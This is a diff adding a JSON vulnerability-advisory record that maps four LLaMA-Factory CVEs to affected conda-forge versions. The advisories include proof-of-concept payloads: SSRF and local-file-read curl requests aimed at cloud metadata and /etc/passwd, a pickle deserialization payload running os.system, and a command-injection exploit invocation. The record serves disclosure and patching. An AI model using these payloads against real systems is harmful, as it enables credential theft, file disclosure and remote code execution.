@@ -1,0 +1,428 @@
+{
+  "schema_version": 1,
+  "package": "llmtuner",
+  "purls": [
+    "pkg:pypi/llmtuner",
+    "pkg:pypi/llamafactory"
+  ],
+  "generated_at": "2026-05-23T06:03:35+00:00",
+  "conda_versions_total": 13,
+  "advisories": [
+    {
+      "schema_version": "1.7.5",
+      "id": "GHSA-527m-2xhr-j27g",
+      "published": "2025-10-07T22:08:53Z",
+      "modified": "2026-03-19T21:01:37.786769Z",
+      "aliases": [
+        "CVE-2025-61784"
+      ],
+      "summary": "LLaMA Factory's Chat API Contains Critical SSRF and LFI Vulnerabilities",
+      "details": "## Summary ##\n\nA Server-Side Request Forgery (SSRF) vulnerability in the chat API allows any authenticated user to force the server to make arbitrary HTTP requests to internal and external networks. This can lead to the exposure of sensitive internal services, reconnaissance of the internal network, or interaction with third-party services. The same mechanism also allows for a Local File Inclusion (LFI) vulnerability, enabling users to read arbitrary files from the server's filesystem.\n\n## Details ##\nThe vulnerability exists in the _process_request function within src/llamafactory/api/chat.py. This function is responsible for processing incoming multimodal content, including images, videos, and audio provided via URLs.\n\nThe function checks if the provided URL is a base64 data URI or a local file path (os.path.isfile). If neither is true, it falls back to treating the URL as a web URI and makes a direct HTTP GET request using requests.get(url, stream=True).raw without any validation or sanitization of the URL.\n\nVulnerable Code Snippets in _process_request:\n```\n# ...\n        elif input_item.type == \"image_url\":\n            # ...\n            else:  # web uri\n                image_stream = requests.get(image_url, stream=True).raw\n# ...\n        elif input_item.type == \"video_url\":\n            # ...\n            else:  # web uri\n                video_stream = requests.get(video_url, stream=True).raw\n# ...\n        elif input_item.type == \"audio_url\":\n            # ...\n            else:  # web uri\n                audio_stream = requests.get(audio_url, stream=True).raw\n# ...\n```\nThis vulnerable function is called by create_chat_completion_response and create_stream_chat_completion_response, which are in turn called by the public-facing /v1/chat/completions API endpoint in src/llamafactory/api/app.py. A user can craft a request to this endpoint containing a malicious URL in the messages payload to trigger the vulnerability.\n\n## PoC ##\nTo reproduce the vulnerability, send a POST request to the /v1/chat/completions endpoint with a JSON payload containing a URL that points to an internal or controlled external service.\n\nStart the LLaMA Factory API server.\n\nUse curl to send the malicious request. The following example uses a URL pointing to the AWS metadata service, a common SSRF attack vector.\n\nSSRF Payload:\n```\ncurl -X POST \"http://127.0.0.1:8000/v1/chat/completions\" \\\n-H \"Content-Type: application/json\" \\\n-H \"Authorization: Bearer your_api_key\" \\\n-d '{\n  \"model\": \"your-model-name\",\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": [\n        {\n          \"type\": \"text\",\n          \"text\": \"What is in this image?\"\n        },\n        {\n          \"type\": \"image_url\",\n          \"image_url\": {\n            \"url\": \"http://169.254.169.254/latest/meta-data/\"\n          }\n        }\n      ]\n    }\n  ]\n}'\n```\nLFI Payload:\n```\ncurl -X POST \"http://127.0.0.1:8000/v1/chat/completions\" \\\n-H \"Content-Type: application/json\" \\\n-H \"Authorization: Bearer your_api_key\" \\\n-d '{\n  \"model\": \"your-model-name\",\n  \"messages\": [\n    {\n      \"role\": \"user\",\n      \"content\": [\n        {\n          \"type\": \"text\",\n          \"text\": \"What is in this image?\"\n        },\n        {\n          \"type\": \"image_url\",\n          \"image_url\": {\n            \"url\": \"/etc/passwd\"\n          }\n        }\n      ]\n    }\n  ]\n}'\n```\nThe server will make a request to the specified URL or read the specified local file.\n\n## Impact ##\nVulnerability Type: Server-Side Request Forgery (SSRF) and Local File Inclusion (LFI).\n\nImpacted Component: The API server, specifically the /v1/chat/completions endpoint.\n\nWho is impacted: Any user who can send requests to the chat API. The vulnerability allows an attacker to bypass firewalls and access internal network resources, query cloud metadata services for credentials, or read sensitive files on the server. The severity is critical.\n\n## Credits\nWenhao Wu, ChengGao, Alibaba Cloud Intelligence Security Team",
+      "affected": [
+        {
+          "package": {
+            "name": "llamafactory",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/llamafactory"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.9.4"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "0.7.1",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.9.0",
+            "0.9.1",
+            "0.9.2",
+            "0.9.3"
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 0.9.3",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-527m-2xhr-j27g/GHSA-527m-2xhr-j27g.json"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LlamaFactory/security/advisories/GHSA-527m-2xhr-j27g"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-61784"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LLaMAFactory/commit/95b7188090a1018935c9dc072bfc97f24f1c96e9"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/hiyouga/LLaMA-Factory"
+        }
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-22",
+          "CWE-918"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2025-10-07T22:08:53Z",
+        "nvd_published_at": "2025-10-07T19:15:39Z",
+        "severity": "HIGH",
+        "conda-forge": {
+          "package": "llmtuner",
+          "purl": "pkg:conda/llmtuner?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/llmtuner",
+            "pkg:pypi/llamafactory"
+          ],
+          "affected_versions": [
+            "0.7.1",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.9.0",
+            "0.9.1",
+            "0.9.2",
+            "0.9.3"
+          ],
+          "conda_versions_total": 13,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-05-23T06:03:35+00:00"
+        }
+      },
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L"
+        }
+      ]
+    },
+    {
+      "schema_version": "1.7.3",
+      "id": "GHSA-f2f7-gj54-6vpv",
+      "published": "2025-04-23T22:21:13Z",
+      "modified": "2025-06-28T00:15:38.121994Z",
+      "aliases": [
+        "CVE-2025-46567"
+      ],
+      "related": [
+        "CVE-2025-46567"
+      ],
+      "summary": "LLaMA-Factory Allows Arbitrary Code Execution via Unsafe Deserialization in Ilamafy_baichuan2.py",
+      "details": "### Description\n\nA critical vulnerability exists in the `llamafy_baichuan2.py` script of the [LLaMA-Factory](https://github.com/hiyouga/LLaMA-Factory) project. The script performs insecure deserialization using `torch.load()` on user-supplied `.bin` files from an input directory. An attacker can exploit this behavior by crafting a malicious `.bin` file that executes arbitrary commands during deserialization.\n\n### Attack Vector\n\nThis vulnerability is **exploitable without authentication or privileges** when a user is tricked into:\n\n1. Downloading or cloning a malicious project folder containing a crafted `.bin` file (e.g. via zip file, GitHub repo).\n2. Running the provided conversion script `llamafy_baichuan2.py`, either manually or as part of an example workflow.\n\nNo elevated privileges are required. The user only needs to run the script with an attacker-supplied `--input_dir`. \n\n### Impact\n\n- Arbitrary command execution (RCE)\n- System compromise\n- Persistence or lateral movement in shared compute environments\n\n\n### Proof of Concept (PoC)\n\n```python\n# malicious_payload.py\nimport torch, pickle, os\n\nclass MaliciousPayload:\n    def __reduce__(self):\n        return (os.system, (\"mkdir HACKED!\",))  # Arbitrary command\n\nmalicious_data = {\n    \"v_head.summary.weight\": MaliciousPayload(),\n    \"v_head.summary.bias\": torch.randn(10)\n}\n\nwith open(\"value_head.bin\", \"wb\") as f:\n    pickle.dump(malicious_data, f)\n```\n\nAn example of `config.json`:\n\n```json\n{\n  \"model\": \"value_head.bin\",\n  \"hidden_size\": 4096,\n  \"num_attention_heads\": 32,\n  \"num_hidden_layers\": 24,\n  \"initializer_range\": 0.02,\n  \"intermediate_size\": 11008,\n  \"max_position_embeddings\": 4096,\n  \"kv_channels\": 128,\n  \"layer_norm_epsilon\": 1e-5,\n  \"tie_word_embeddings\": false,\n  \"vocab_size\": 151936\n}\n```\n\n```bash\n(base) root@d6ab70067470:~/LLaMA-Factory_latest# tree\n.\n`-- LLaMA-Factory\n    |-- LICENSE\n    |-- README.md\n    |-- malicious_folder\n    |   |-- config.json\n    |   `-- value_head.bin\n    `-- xxxxx(Irrelevant documents omitted)\n```\n\n\n```bash\n# Reproduction\npython scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out\n```\n\n\u27a1\ufe0f Running this will execute the malicious payload and create a `HACKED!` folder.\n\n```bash\n(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls\nCITATION.cff  LICENSE  MANIFEST.in  Makefile  README.md  README_zh.md  assets  data  docker  evaluation  examples  malicious_folder  pyproject.toml  requirements.txt  scripts  setup.py  src  tests\n(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# python scripts/convert_ckpt/llamafy_baichuan2.py --input_dir ./malicious_folder --output_dir ./out\n2025-04-23 07:36:58.435304: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:477] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered\nWARNING: All log messages before absl::InitializeLog() is called are written to STDERR\nE0000 00:00:1745393818.451398    1008 cuda_dnn.cc:8310] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered\nE0000 00:00:1745393818.456423    1008 cuda_blas.cc:1418] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered\n2025-04-23 07:36:58.472951: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.\nTo enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.\nLoad weights:  50%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258c                                                                                  | 1/2 [00:00<00:00, 123.70it/s]\nTraceback (most recent call last):\n  File \"/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py\", line 112, in <module>\n    fire.Fire(llamafy_baichuan2)\n  File \"/root/miniconda3/lib/python3.12/site-packages/fire/core.py\", line 135, in Fire\n    component_trace = _Fire(component, args, parsed_flag_args, context, name)\n                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/fire/core.py\", line 468, in _Fire\n    component, remaining_args = _CallAndUpdateTrace(\n                                ^^^^^^^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/fire/core.py\", line 684, in _CallAndUpdateTrace\n    component = fn(*varargs, **kwargs)\n                ^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py\", line 107, in llamafy_baichuan2\n    save_weight(input_dir, output_dir, shard_size, save_safetensors)\n  File \"/root/LLaMA-Factory_latest/LLaMA-Factory/scripts/convert_ckpt/llamafy_baichuan2.py\", line 35, in save_weight\n    shard_weight = torch.load(os.path.join(input_dir, filepath), map_location=\"cpu\")\n                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py\", line 1040, in load\n    return _legacy_load(opened_file, map_location, pickle_module, **pickle_load_args)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/root/miniconda3/lib/python3.12/site-packages/torch/serialization.py\", line 1260, in _legacy_load\n    raise RuntimeError(\"Invalid magic number; corrupt file?\")\nRuntimeError: Invalid magic number; corrupt file?\n(base) root@d6ab70067470:~/LLaMA-Factory_latest/LLaMA-Factory# ls\n CITATION.cff   LICENSE       Makefile    README_zh.md   data     evaluation   malicious_folder   pyproject.toml     scripts    src\n'HACKED!'       MANIFEST.in   README.md   assets         docker   examples     out                requirements.txt   setup.py   tests\n```\n\n### Affected File(s)\n\n- https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35\n- `scripts/convert_ckpt/llamafy_baichuan2.py`\n- Line: `torch.load(os.path.join(input_dir, filepath), map_location=\"cpu\")`\n\n### Suggested Fix\n\n- Replace `torch.load()` with safer alternatives like `safetensors`.\n- Validate and whitelist file types before deserialization.\n- Require checksum validation.\n\nExample patch:\n\n```python\n# Replace torch.load() with safe deserialization\ntry:\n    from safetensors.torch import load_file\n    tensor_data = load_file(filepath)\nexcept Exception:\n    print(\"Invalid or unsafe checkpoint file.\")\n    return\n```\n\n### Workarounds\n\n- Avoid running the script with untrusted `.bin` files.\n- Use containers or VMs to isolate script execution.\n\n### References\n\n- [torch.load() \u2014 PyTorch Docs](https://pytorch.org/docs/stable/generated/torch.load.html)\n- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)\n\n### Credits\n\nDiscovered and reported by [Yu Rong](https://github.com/Anchor0221) and [Hao Fan](https://github.com/xhjy2020), 2025-04-23",
+      "affected": [
+        {
+          "package": {
+            "name": "llamafactory",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/llamafactory"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.9.3"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "0.7.1",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.9.0",
+            "0.9.1",
+            "0.9.2"
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 0.9.2",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/04/GHSA-f2f7-gj54-6vpv/GHSA-f2f7-gj54-6vpv.json"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-f2f7-gj54-6vpv"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-46567"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LLaMA-Factory/commit/2989d39239d2f46e584c1e1180ba46b9768afb2a"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/hiyouga/LLaMA-Factory"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LLaMA-Factory/blob/main/scripts/convert_ckpt/llamafy_baichuan2.py#L35"
+        }
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-502"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2025-04-23T22:21:13Z",
+        "nvd_published_at": "2025-05-01T18:15:58Z",
+        "severity": "MODERATE",
+        "conda-forge": {
+          "package": "llmtuner",
+          "purl": "pkg:conda/llmtuner?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/llmtuner",
+            "pkg:pypi/llamafactory"
+          ],
+          "affected_versions": [
+            "0.7.1",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.9.0",
+            "0.9.1",
+            "0.9.2"
+          ],
+          "conda_versions_total": 13,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-05-23T06:03:35+00:00"
+        }
+      },
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:L"
+        }
+      ]
+    },
+    {
+      "schema_version": "1.7.3",
+      "id": "GHSA-hj3w-wrh4-44vp",
+      "published": "2024-11-21T22:20:45Z",
+      "modified": "2025-08-27T18:54:15.524345Z",
+      "aliases": [
+        "CVE-2024-52803"
+      ],
+      "summary": "LLama Factory Remote OS Command Injection Vulnerability",
+      "details": "## Summary\n\nA critical remote OS command injection vulnerability has been identified in the Llama Factory training process. This vulnerability arises from improper handling of user input, allowing malicious actors to execute arbitrary OS commands on the host system. The issue is caused by insecure usage of the `Popen` function with `shell=True`, coupled with unsanitized user input. Immediate remediation is required to mitigate the risk.\n\n## Affected Version\n\nLlama Factory versions **<=0.9.0** are affected by this vulnerability.\n\n## Impact\n\nExploitation of this vulnerability allows attackers to:\n\n1. Execute arbitrary OS commands on the server.\n2. Potentially compromise sensitive data or escalate privileges.\n3. Deploy malware or create persistent backdoors in the system.\n\nThis significantly increases the risk of data breaches and operational disruption.\n\n## Root Cause\n\nThe vulnerability originates from the training process where the `output_dir` value, obtained from the user input, is injected into the popen function without any sanitization. Furthermore, popen is invoked in a unsafe way by enabling the interact shell (`shell=True`), leading to remote OS command injection vulnerability.\n\nVulnerable snippet: \n\n```python\n# https://github.com/hiyouga/LLaMA-Factory/blob/bd639a137e6f46e1a0005cc91572f5f1ec894f74/src/llamafactory/webui/runner.py#L304-L323\ndef _launch(self, data: Dict[\"Component\", Any], do_train: bool) -> Generator[Dict[\"Component\", Any], None, None]:\n\t\t\t\t...\n        args = self._parse_train_args(data) if do_train else self._parse_eval_args(data)\n\t\t\t\t...\n        self.trainer = Popen(f\"llamafactory-cli train {save_cmd(args)}\", env=env, shell=True)\n        yield from self.monitor()\n```\n\n## Proof of Concept (PoC)\n\n### Steps to Reproduce\n\n- Deploy llama factory\n\n- Execute the exploitation script from: https://gist.github.com/superboy-zjc/f2d2b93ae511c445ba97e144b70e534d\n\n  ```bash\n  python3 llama-factory-rce.py --url http://127.0.0.1:7861 --cmd \"curl XXX\" --trace\n  ```\n\n![llama-factory-rce](https://api.2h0ng.wiki:443/noteimages/2024/11/21/00-33-37-5347128a141f8765e7d218c89d94162a.gif)\n\nBad actors are able to execute any OS command as they want.\n\n## Remediation Recommendations\n\n**Avoid using `shell=True` in `Popen`.**\n\n- Instead, pass the command and its arguments as a list. This prevents user inputs from being executed as part of a shell command.\n\n```python\ncmd = [\n    \"llamafactory-cli\",\n    \"train\", \n  \t*save_cmd(args).split(),\n]\nself.trainer = Popen(cmd, env=env)\n```",
+      "affected": [
+        {
+          "package": {
+            "name": "llamafactory",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/llamafactory"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.9.1"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "0.7.1",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.9.0"
+          ],
+          "database_specific": {
+            "last_known_affected_version_range": "<= 0.9.0",
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-hj3w-wrh4-44vp/GHSA-hj3w-wrh4-44vp.json"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-hj3w-wrh4-44vp"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52803"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LLaMA-Factory/commit/b3aa80d54a67da45e9e237e349486fb9c162b2ac"
+        },
+        {
+          "type": "WEB",
+          "url": "https://gist.github.com/superboy-zjc/f2d2b93ae511c445ba97e144b70e534d"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/hiyouga/LLaMA-Factory"
+        }
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-78",
+          "CWE-79"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-11-21T22:20:45Z",
+        "nvd_published_at": "2024-11-21T17:15:24Z",
+        "severity": "HIGH",
+        "conda-forge": {
+          "package": "llmtuner",
+          "purl": "pkg:conda/llmtuner?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/llmtuner",
+            "pkg:pypi/llamafactory"
+          ],
+          "affected_versions": [
+            "0.7.1",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.9.0"
+          ],
+          "conda_versions_total": 13,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-05-23T06:03:35+00:00"
+        }
+      },
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ]
+    },
+    {
+      "schema_version": "1.7.3",
+      "id": "GHSA-xj56-p8mm-qmxj",
+      "published": "2025-06-27T15:27:01Z",
+      "modified": "2025-06-27T16:17:35.612264Z",
+      "aliases": [
+        "CVE-2025-53002"
+      ],
+      "summary": "LLaMA-Factory allows Code Injection through improper vhead_file safeguards",
+      "details": "### Summary\nA critical remote code execution vulnerability was discovered during the Llama Factory training process. This vulnerability arises because the `vhead_file` is loaded without proper safeguards, allowing malicious attackers to execute arbitrary malicious code on the host system simply by passing a malicious `Checkpoint path` parameter through the `WebUI` interface. The attack is stealthy, as the victim remains unaware of the exploitation. The root cause is that the `vhead_file` argument is loaded without the secure parameter `weights_only=True`.\n\nNote: In torch versions <2.6, the default setting is `weights_only=False`, and Llama Factory's `setup.py` only requires `torch>=2.0.0`.\n\n### Affected Version\n\nLlama Factory versions <=0.9.3 are affected by this vulnerability.\n\n### Details\n\n1. In LLaMA Factory's WebUI, when a user sets the `Checkpoint path`, it modifies the `adapter_name_or_path` parameter passed to the training process.\ncode in src/llamafactory/webui/runner.py\n<img width=\"1040\" alt=\"image-1\" src=\"https://github.com/user-attachments/assets/c8bc79e4-ce7d-43c9-b0fd-e37c235e6585\" />\n\n2. The `adapter_name_or_path` passed to the training process is then used in `src/llamafactory/model/model_utils/valuehead.py` to fetch the corresponding `value_head.bin` file from Hugging Face. This file is subsequently loaded via `torch.load()` without the security parameter `weights_only=True` being set, resulting in remote code execution.\ncode in src/llamafactory/model/model_utils/valuehead.py\n<img width=\"1181\" alt=\"image-2\" src=\"https://github.com/user-attachments/assets/6edbe694-0c60-4a54-bfb3-5e1042c9230d\" />\n\n### PoC\n\n#### Steps to Reproduce\n\n1. Deploy llama factory.\n2. Remote attack through the WebUI interface\n    1. Configure `Model name` and `Model path`  correctly. For demonstration purposes, we'll use a small model `llamafactory/tiny-random-Llama-3` to accelerate model loading.\n    2. Set `Finetuning method` to `LoRA` and `Train Stage` to `Reward Modeling`. The vulnerability is specifically triggered during the Reward Modeling training stage.\n    3. Input a malicious Hugging Face path in `Checkpoint path` \u2013 here we use `paulinsider/llamafactory-hack`. This repository(https://huggingface.co/paulinsider/llamafactory-hack/tree/main ) contains a malicious `value_head.bin` file. The generation method for this file is as follows (it can execute arbitrary attack commands; for demonstration, we configured it to create a `HACKED!` folder).\n    4. Click `Start` to begin training. After a brief wait, a `HACKED!` folder will be created on the server. Note that arbitrary malicious code could be executed through this method.\n\n**The video demonstration of the vulnerability exploitation is available at the** [Google Drive Link](https://drive.google.com/file/d/1AddKm2mllsXfuvL4Tvbn_WJdjEOYXx4y/view?usp=sharing) \n\n### Impact\nExploitation of this vulnerability allows remote attackers to:\n - Execute arbitrary malicious code / OS commands on the server.\n - Potentially compromise sensitive data or escalate privileges.\n - Deploy malware or create persistent backdoors in the system.\nThis significantly increases the risk of data breaches and operational disruption.",
+      "affected": [
+        {
+          "package": {
+            "name": "llamafactory",
+            "ecosystem": "PyPI",
+            "purl": "pkg:pypi/llamafactory"
+          },
+          "ranges": [
+            {
+              "type": "ECOSYSTEM",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "last_affected": "0.9.3"
+                }
+              ]
+            }
+          ],
+          "versions": [
+            "0.7.1",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.9.0",
+            "0.9.1",
+            "0.9.2",
+            "0.9.3"
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-xj56-p8mm-qmxj/GHSA-xj56-p8mm-qmxj.json"
+          }
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LLaMA-Factory/security/advisories/GHSA-xj56-p8mm-qmxj"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-53002"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/hiyouga/LLaMA-Factory/commit/bb7bf51554d4ba8432333c35a5e3b52705955ede"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/hiyouga/LLaMA-Factory"
+        }
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-94"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2025-06-27T15:27:01Z",
+        "nvd_published_at": "2025-06-26T15:15:23Z",
+        "severity": "HIGH",
+        "conda-forge": {
+          "package": "llmtuner",
+          "purl": "pkg:conda/llmtuner?channel=conda-forge",
+          "source_purls": [
+            "pkg:pypi/llmtuner",
+            "pkg:pypi/llamafactory"
+          ],
+          "affected_versions": [
+            "0.7.1",
+            "0.8.0",
+            "0.8.1",
+            "0.8.2",
+            "0.8.3",
+            "0.9.0",
+            "0.9.1",
+            "0.9.2",
+            "0.9.3"
+          ],
+          "conda_versions_total": 13,
+          "derived_by": "purl-associator/scripts.cve_match",
+          "generated_at": "2026-05-23T06:03:35+00:00"
+        }
+      },
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:H"
+        }
+      ]
+    }
+  ]
+}
